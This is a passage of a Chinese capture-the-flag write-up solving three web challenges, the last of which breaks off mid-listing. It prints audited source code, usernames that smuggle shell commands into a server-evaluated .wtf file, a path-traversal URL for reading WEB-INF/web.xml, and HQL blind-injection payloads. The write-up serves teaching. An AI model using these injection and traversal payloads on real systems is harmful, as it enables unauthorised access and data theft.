$&#123;!URL_PARAMS[@]&#125; &amp;&amp; file_exists &quot;users/$&#123;URL_PARAMS[&#x27;user&#x27;]&#125;&quot;</span><br><span class="line">$ then</span><br><span class="line">$   local username=$(head -n 1 users/$&#123;URL_PARAMS[&#x27;user&#x27;]&#125;);</span><br><span class="line">$   echo &quot;<span class="tag">&lt;<span class="name">h3</span>&gt;</span>$&#123;username&#125;&#x27;s posts:<span class="tag">&lt;/<span class="name">h3</span>&gt;</span>&quot;;</span><br><span class="line">$   echo &quot;<span class="tag">&lt;<span class="name">ol</span>&gt;</span>&quot;;</span><br><span class="line">$   get_users_posts &quot;$&#123;username&#125;&quot; | while read -r post; do</span><br><span class="line">$       post_slug=$(awk -F/ &#x27;&#123;print $2 &quot;#&quot; $3&#125;&#x27; &lt;&lt;&lt; &quot;$&#123;post&#125;&quot;);</span><br><span class="line">$       echo &quot;<span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">\</span>&quot;/<span class="attr">post.wtf</span>?<span class="attr">post</span>=<span class="string">$&#123;post_slug&#125;\</span>&quot;&gt;</span>$(nth_line 2 &quot;$&#123;post&#125;&quot; | htmlentities)<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span>&quot;;</span><br><span class="line">$   done </span><br><span class="line">$   echo &quot;<span class="tag">&lt;/<span class="name">ol</span>&gt;</span>&quot;;</span><br><span class="line">$   if is_logged_in &amp;&amp; [[ &quot;$&#123;COOKIES[&#x27;USERNAME&#x27;]&#125;&quot; = &#x27;admin&#x27; ]] &amp;&amp; [[ $&#123;username&#125; = &#x27;admin&#x27; ]]</span><br><span class="line">$   then</span><br><span class="line">$       get_flag1</span><br><span class="line">$   fi</span><br><span class="line">$ fi</span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>注意上面标出的代码，从中我们可以看出：当COOKIES是admin并且USERNAME为admin时，可以get_flag1，于是确定了之后努力的方向是得到admin的COOKIE值；从上面的代码中我们可以发现有/users目录，利用之前的路径穿越尝试进入该目录：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/a1aa24e5ed4b944136edd15c9955de1a.png"></p>
<p>该目录直接存放着所有用户的cookie值，包括我们之前注册的用户1和admin。对比登录时的cookies：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/cdcda0a57c0c36af0e8be0ccf64cef4f.png"></p>
<p>确定这里存放的就是所有用户的token值。所以我们直接利用cookie欺骗来登录admin账户。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/c027351dd95584b54913e0b6661e9b21.png"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/d8d85966e880b584a945d89247dd3aa0.png"></p>
<p>得到flag，但显然flag不完整，只是前半部分。</p>
<p>继续进行代码审计，发现<code>include_page</code>函数存在文件上传漏洞：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">include_page</span> </span>&#123;</span><br><span class="line">    <span class="comment"># include_page pathname</span></span><br><span class="line">    local pathname=$<span class="number">1</span></span><br><span class="line">    local cmd=</span><br><span class="line">    [[ $&#123;pathname(-<span class="number">4</span>)&#125; = <span class="string">&#x27;.wtf&#x27;</span> ]];</span><br><span class="line">    local can_execute=$;</span><br><span class="line">    page_include_depth=$((<span class="variable">$page_include_depth</span>+<span class="number">1</span>))</span><br><span class="line">    <span class="keyword">if</span> [[ <span class="variable">$page_include_depth </span>-lt <span class="variable">$max_page_include_depth </span>]]</span><br><span class="line">    then</span><br><span class="line">        local line;</span><br><span class="line">        <span class="keyword">while</span> read -r line; <span class="keyword">do</span></span><br><span class="line">            <span class="comment"># check if we&#x27;re in a script line or not ($ at the beginning implies script line)</span></span><br><span class="line">            <span class="comment"># also, our extension needs to be .wtf</span></span><br><span class="line">            [[ <span class="variable">$ </span>= $&#123;line01&#125; &amp;&amp; $&#123;can_execute&#125; = <span class="number">0</span> ]];</span><br><span class="line">            is_script=$;</span><br><span class="line">            <span class="comment"># execute the line.</span></span><br><span class="line">            <span class="keyword">if</span> [[ <span class="variable">$is_script </span>= <span class="number">0</span> ]]</span><br><span class="line">            then</span><br><span class="line">                cmd+=$<span class="string">&#x27;n&#x27;</span>$&#123;line<span class="comment">#$&#125;;</span></span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="keyword">if</span> [[ -n <span class="variable">$cmd </span>]]</span><br><span class="line">                then</span><br><span class="line">                    <span class="keyword">eval</span> <span class="variable">$cmd  log Error during execution of</span> $&#123;cmd&#125;;</span><br><span class="line">                    cmd=</span><br><span class="line">                fi</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$line</span></span><br><span class="line">            fi</span><br><span class="line">        done  $&#123;pathname&#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">echo</span> pMax <span class="keyword">include</span> depth exceeded!p</span><br><span class="line">    fi</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>继续观察，发现reply函数也存在路径穿越漏洞：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">reply</span> </span>&#123;</span><br><span class="line">    local post_id=$<span class="number">1</span>;</span><br><span class="line">    local username=$<span class="number">2</span>;</span><br><span class="line">    local text=$<span class="number">3</span>;</span><br><span class="line">    local hashed=$(hash_username <span class="string">&quot;$&#123;username&#125;&quot;</span>);</span><br><span class="line">    curr_id=$(<span class="keyword">for</span> d in posts/$&#123;post_id&#125;<span class="comment">/*; do basename $d; done | sort -n | tail -n 1);</span></span><br><span class="line"><span class="comment">    next_reply_id=$(awk &#x27;&#123;print $1+1&#125;&#x27; &lt;&lt;&lt; &quot;$&#123;curr_id&#125;&quot;);</span></span><br><span class="line"><span class="comment">    next_file=(posts/$&#123;post_id&#125;/$&#123;next_reply_id&#125;);</span></span><br><span class="line"><span class="comment">    echo &quot;$&#123;username&#125;&quot; &gt; &quot;$&#123;next_file&#125;&quot;;</span></span><br><span class="line"><span class="comment">    echo &quot;RE: $(nth_line 2 &lt; &quot;posts/$&#123;post_id&#125;/1&quot;)&quot; &gt;&gt; &quot;$&#123;next_file&#125;&quot;;</span></span><br><span class="line"><span class="comment">    echo &quot;$&#123;text&#125;&quot; &gt;&gt; &quot;$&#123;next_file&#125;&quot;;</span></span><br><span class="line"><span class="comment">    # add post this is in reply to to posts cache</span></span><br><span class="line"><span class="comment">    echo &quot;$&#123;post_id&#125;/$&#123;next_reply_id&#125;&quot; &gt;&gt; &quot;users_lookup/$&#123;hashed&#125;/posts&quot;;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br></pre></td></tr></table></figure>

<p>上面标记的一行代码把用户名写在了评论文件的内容中。</p>
<p>结合上面两段代码和黄色重点标记的部分，我们可以推测如果用户名是一段可执行代码，同时写入wtf格式文件，那么这个文件就能够执行我们想要的代码。</p>
<p>由得到前半段flag的文件get_flag1推测，后半段flag的文件名应为get_flag2，于是我们先注册一个用户名为<code>\$&#123;find,/,-iname,get_flag2&#125;</code>的普通用户，用来寻找所有目录下的get_flag2文件。然后我们测试一下前面提到的文件上传漏洞。将post路径改为如下所示，上传名为test1.wtf的文件，在这里文件的内容没有意义，执行的是USERNAME，即<code>\$&#123;find,/,-iname,get_flag2&#125;</code>，用来寻找flag2路径.</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/88f14ee2803cedf895270ab6bbcba866.png"></p>
<p>上传成功后我们打开这个文件，可以得到flag2的路径：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/10f2caf48d231a51678cb63b027d0a2a.png"></p>
<p>下面我们利用这个路径得到flag2。注册一个名为<code>\$/usr/bin/get_flag2</code>的用户，利用以上方法上传attack.wtf文件：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/b20da88afa4c44ee711c4fa029f64677.png"></p>
<p>打开该文件，得到flag2。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/e0a3e915117dbf6eabbb3ec1d970468b.png"></p>
<p>拼接flag1和flag2得到xctf{cb49256d1ab48803149e5ec49d3c29ca}.</p>
<h2 id="Zhuanxv-（难度：7-10）"><a href="#Zhuanxv-（难度：7-10）" class="headerlink" title="Zhuanxv （难度：7/10）"></a>Zhuanxv （难度：7/10）</h2><p>结合题目描述中的“你只是在扫描目标端口的时候发现了一个开放的web服务”，使用webdirscan工具扫描一下，得到以下结果：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/fcc72f547692369aa6041d550264c158.png"></p>
<p>打开<a target="_blank" rel="noopener" href="http://111.200.241.244:59982/list%E5%8F%AF%E4%BB%A5%E5%BE%97%E5%88%B0%E4%B8%80%E4%B8%AA%E7%99%BB%E5%BD%95%E7%95%8C%E9%9D%A2%EF%BC%9A">http://111.200.241.244:59982/list可以得到一个登录界面：</a></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/2d67ecd7dce7fce58e1717ffd986c0c7.png"></p>
<p>仔细审阅代码，发现疑似文件包含漏洞：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/784206267500573fb86da08696200745.png"></p>
<p>同时发现cookie中含有<code>JESSIONID</code>字段：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/18d717345b071e4c35e43f27b361c724.png"></p>
<p>于是怀疑该网页所用语言为Java，于是我们尝试利用上面的文件包含漏洞寻找web.xml页面。构造payload为<code>http://111.200.241.244:59982/loadimage?fileName=../../WEB-INF/web.xml</code>，访问，得到bg.jpg，用记事本打开，可以得到源代码：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">id</span>=<span class="string">&quot;WebApp_9&quot;</span> <span class="attr">version</span>=<span class="string">&quot;2.4&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns</span>=<span class="string">&quot;http://java.sun.com/xml/ns/j2ee&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://java.sun.com/xml/ns/j2ee http://java.sun.com/xml/ns/j2ee/web-app_2_4.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">display-name</span>&gt;</span>Struts Blank<span class="tag">&lt;/<span class="name">display-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>struts2<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>org.apache.struts2.dispatcher.ng.filter.StrutsPrepareAndExecuteFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>struts2<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">welcome-file-list</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">welcome-file</span>&gt;</span>/ctfpage/index.jsp<span class="tag">&lt;/<span class="name">welcome-file</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">welcome-file-list</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">error-page</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">error-code</span>&gt;</span>404<span class="tag">&lt;/<span class="name">error-code</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">location</span>&gt;</span>/ctfpage/404.html<span class="tag">&lt;/<span class="name">location</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">error-page</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>发现strust2文件，即Struts2框架的全局属性文件，利用文件包含漏洞访问该文件：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">struts</span> <span class="meta-keyword">PUBLIC</span></span></span><br><span class="line"><span class="meta">        <span class="meta-string">&quot;-//Apache Software Foundation//DTD Struts Configuration 2.3//EN&quot;</span></span></span><br><span class="line"><span class="meta">        <span class="meta-string">&quot;http://struts.apache.org/dtds/struts-2.3.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">struts</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">constant</span> <span class="attr">name</span>=<span class="string">&quot;strutsenableDynamicMethodInvocation&quot;</span> <span class="attr">value</span>=<span class="string">&quot;false&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">constant</span> <span class="attr">name</span>=<span class="string">&quot;struts.mapper.alwaysSelectFullNamespace&quot;</span> <span class="attr">value</span>=<span class="string">&quot;true&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">constant</span> <span class="attr">name</span>=<span class="string">&quot;struts.action.extension&quot;</span> <span class="attr">value</span>=<span class="string">&quot;,&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">&quot;front&quot;</span> <span class="attr">namespace</span>=<span class="string">&quot;/&quot;</span> <span class="attr">extends</span>=<span class="string">&quot;struts-default&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">global-exception-mappings</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">exception-mapping</span> <span class="attr">exception</span>=<span class="string">&quot;java.lang.Exception&quot;</span> <span class="attr">result</span>=<span class="string">&quot;error&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">global-exception-mappings</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">&quot;zhuanxvlogin&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.cuitctf.action.UserLoginAction&quot;</span> <span class="attr">method</span>=<span class="string">&quot;execute&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;error&quot;</span>&gt;</span>/ctfpage/login.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;success&quot;</span>&gt;</span>/ctfpage/welcome.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">&quot;loadimage&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.cuitctf.action.DownloadAction&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;success&quot;</span> <span class="attr">type</span>=<span class="string">&quot;stream&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">&quot;contentType&quot;</span>&gt;</span>image/jpeg<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">&quot;contentDisposition&quot;</span>&gt;</span>attachment;filename=&quot;bg.jpg&quot;<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">&quot;inputName&quot;</span>&gt;</span>downloadFile<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;suffix_error&quot;</span>&gt;</span>/ctfpage/welcome.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">package</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">&quot;back&quot;</span> <span class="attr">namespace</span>=<span class="string">&quot;/&quot;</span> <span class="attr">extends</span>=<span class="string">&quot;struts-default&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">interceptors</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">interceptor</span> <span class="attr">name</span>=<span class="string">&quot;oa&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.cuitctf.util.UserOAuth&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">interceptor-stack</span> <span class="attr">name</span>=<span class="string">&quot;userAuth&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">interceptor-ref</span> <span class="attr">name</span>=<span class="string">&quot;defaultStack&quot;</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">interceptor-ref</span> <span class="attr">name</span>=<span class="string">&quot;oa&quot;</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">interceptor-stack</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">        <span class="tag">&lt;/<span class="name">interceptors</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">&quot;list&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.cuitctf.action.AdminAction&quot;</span> <span class="attr">method</span>=<span class="string">&quot;execute&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">interceptor-ref</span> <span class="attr">name</span>=<span class="string">&quot;userAuth&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">&quot;excludeMethods&quot;</span>&gt;</span></span><br><span class="line">                    execute</span><br><span class="line">                <span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">interceptor-ref</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;login_error&quot;</span>&gt;</span>/ctfpage/login.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;list_error&quot;</span>&gt;</span>/ctfpage/welcome.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;success&quot;</span>&gt;</span>/ctfpage/welcome.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">package</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">struts</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>文件里包含了很多class名，使用文件包含漏洞可以逐个下载。下载后将文件扩展名改为.class，用<code>jd-gui</code> java反编译工具进行反编译：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/03edafc996c93920d2f0236ac05286fa.png"></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">userCheck</span><span class="params">(User user)</span> </span>&#123;</span><br><span class="line"> List&lt;User&gt; userList = <span class="keyword">this</span>.userService.loginCheck(user.getName(), user.getPassword());</span><br><span class="line"> <span class="keyword">if</span> (userList != <span class="keyword">null</span> &amp;&amp; userList.size() == <span class="number">1</span>) &#123;</span><br><span class="line">   <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> addActionError(<span class="string">&quot;Username or password is Wrong, please check!&quot;</span>);</span><br><span class="line"> <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> List &lt;User&gt; loginCheck(String name, String password) &#123;</span><br><span class="line">    name = name.replaceAll(<span class="string">&quot; &quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">    name = name.replaceAll(<span class="string">&quot;=&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">    Matcher username_matcher = Pattern.compile(<span class="string">&quot;^[0-9a-zA-Z]+$&quot;</span>).matcher(name);</span><br><span class="line">    Matcher password_matcher = Pattern.compile(<span class="string">&quot;^[0-9a-zA-Z]+$&quot;</span>).matcher(password);</span><br><span class="line">    <span class="keyword">if</span> (password_matcher.find()) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.userDao.loginCheck(name, password);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> List &lt; User &gt; loginCheck(String name, String password) &#123;</span><br><span class="line">       <span class="keyword">return</span> getHibernateTemplate().find(<span class="string">&quot;from User where name =&#x27;&quot;</span> + name + <span class="string">&quot;&#x27; and password = &#x27;&quot;</span> + password + <span class="string">&quot;&#x27;&quot;</span>);  </span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>以上代码片段是反编译后得到的登录和用户校验的代码，结合以上代码可以构造payload：<code>(select%0Aascii(substr(id,&quot;+str(i)+&quot;,1))%0Afrom%0AFlag%0Awhere%0Aid\&lt;2)\&lt;&#39;&quot;+str(j)+&quot;&#39;</code>以及URL：”<code>%0Aor%0Aname%0Alike%0A&#39;admin&amp;user.password=1</code>“，使用脚本进行盲注，得到flag：<code>sctf&#123;C46E250926A2DFFD831975396222B08E&#125;</code>。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/e612afe02edb8e93583c659b2d7359dd.png"></p>
<h2 id="blgdel-（难度：8-10）"><a href="#blgdel-（难度：8-10）" class="headerlink" title="blgdel （难度：8/10）"></a>blgdel （难度：8/10）</h2><p>首先使用御剑专业版扫描一下目录：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/fe559a7ed170a262e055fef1679db42a.png"></p>
<p>打开/robots.txt文件后如图，指向了另一个网站路径：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/593f27f33ea1a56d4e0a2e6f8e424d99.png"></p>
<p>打开后页面内包含了网站源代码，于是进行代码审计。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span 